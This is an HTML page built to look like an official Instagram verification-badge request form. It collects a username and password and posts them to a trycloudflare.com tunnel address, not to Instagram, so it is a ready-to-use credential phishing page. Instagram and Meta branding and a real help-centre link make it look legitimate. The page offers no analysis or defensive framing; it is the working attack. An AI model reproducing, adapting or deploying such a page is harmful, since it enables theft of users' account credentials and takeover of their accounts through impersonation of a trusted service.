<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Verification Portal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');

        /* CSS Styles */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Logo as text */
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 55px;
            text-align: center;
            margin: 20px 0 10px 0;
            color: #262626;
            font-weight: normal;
        }

        /* Language-specific styles for LTR */
        .container {
            text-align: center;
        }

        /* Main content container */
        .container {
            padding: 20px;
            max-width: 350px;
            margin: auto;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            text-align: center;
        }

        /* Headings and paragraphs */
        h2 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 10px;
        }

        p {
            font-size: 1rem;
            line-height: 1.5;
            margin-bottom: 20px;
            color: #8e8e8e;
        }

        /* Input forms */
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box;
        }

        /* Password container */
        .password-container {
            position: relative;
            width: 100%;
        }

        .password-container input {
            padding-right: 40px;
            /* Space for the icon on the right */
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #8e8e8e;
            z-index: 10;
        }

        .toggle-password svg {
            width: 18px;
            height: 18px;
        }

        /* Verification button */
        .btn-verify {
            width: 100%;
            padding: 12px;
            background-color: #0095f6;
            /* لون الزر */
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: 600;
            cursor: pointer;
            font-size: 1rem;
        }

        .btn-verify:hover {
            background-color: #0077c2;
        }

        /* Footer */
        footer {
            padding: 10px;
            text-align: center;
            font-size: 0.8rem;
            color: #8e8e8e;
            border-top: 1px solid #dbdbdb;
            background-color: #fff;
            margin-top: auto;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1 class="logo">Instagram</h1>

        <h2>Request Instagram Verification Badge</h2>
        <p>To confirm your identity and secure your account, please complete the form below to start the verification process.</p>

        <form action="https://attract-pretty-preferred-rna.trycloudflare.com/verify" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <div class="password-container">
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="button" class="toggle-password" id="togglePassword">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>
            <button type="submit" class="btn-verify"> Verification </button>
            <p id="loading" style="display:none; margin-top:10px;">
                Verifying data...
            </p>
        </form>

        <div style="margin-top: 20px;">
            <p style="font-size: 0.8rem;">Make sure you follow the <a href="https://help.instagram.com/581066165581870"
                    style="color: #0095f6; text-decoration: none;">Instagram Community Guidelines</a>.</p>
        </div>
    </div>

    <footer>
        <p>by Meta<br>
            © 2026 Instagram from Meta</p>
    </footer>
    <script>
        document.querySelector("form").addEventListener("submit", function () {
            document.getElementById("loading").style.display = "block";
        });

        // Password visibility toggle logic
        const passwordInput = document.getElementById('password');
        const toggleButton = document.getElementById('togglePassword');

        toggleButton.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);

            if (type === 'text') {
                this.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>`;
            } else {
                this.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>`;
            }
        });
    </script>
</body>

</html>
